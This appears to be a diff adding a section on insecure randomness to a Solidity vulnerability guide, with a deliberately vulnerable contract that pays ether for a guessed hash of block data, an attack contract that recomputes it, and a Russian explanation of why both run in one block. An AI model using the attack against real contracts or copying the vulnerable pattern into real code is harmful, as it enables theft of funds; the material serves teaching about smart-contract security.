@@ -110,3 +110,47 @@ contract EthBankExploit {
 }
 ```
 
+#### INSECURE SOURCE OF RANDOMNESS:  
+
+Vulnerable contract:  
+
+```
+contract RandomNumber {
+
+    constructor public payable {}
+
+    function guess(uint _guess) public {
+        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
+        if (_guess == answer) {
+            (bool sent,) = msg.sender.call{value: 1 ether}("");
+            require(sent, "Fail");
+        }
+    }
+}
+```
+
+Attack contract:  
+
+```
+contract Attack {
+    fallback() external payable {}
+
+    function attack(RandomNumber randomNumber) {
+        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
+        randomNumber.guess(answer);
+    }
+}
+```
+
+Атакующий контракт, и уязвимый контракт работают в одном блоке, потому что вызов контракта-атакующего инициируется внешним пользователем, и все транзакции, вызванные в рамках этой операции, обрабатываются в контексте одного блока.  
+
+**Эфир и обработка транзакций**:  
+
+В Ethereum каждая транзакция включается в блок и выполняется в рамках его характеристик (например, blockhash, block.timestamp, block.number).
+Если одна транзакция вызывает несколько контрактов (через вызовы call или delegatecall), все эти вызовы происходят в том же самом блоке, используя одну и ту же информацию о блоке.
+
+**Контекст вызова**:  
+
+Когда атакующий контракт вызывает уязвимый контракт через: ```randomNumber.guess(answer);```, оба контракта работают в рамках одной транзакции, обработанной майнером.
+Таким образом, вызов block.timestamp и blockhash(block.number - 1) в атакующем контракте возвращает те же самые значения, что и в уязвимом контракте, потому что это одна и та же транзакция.
+
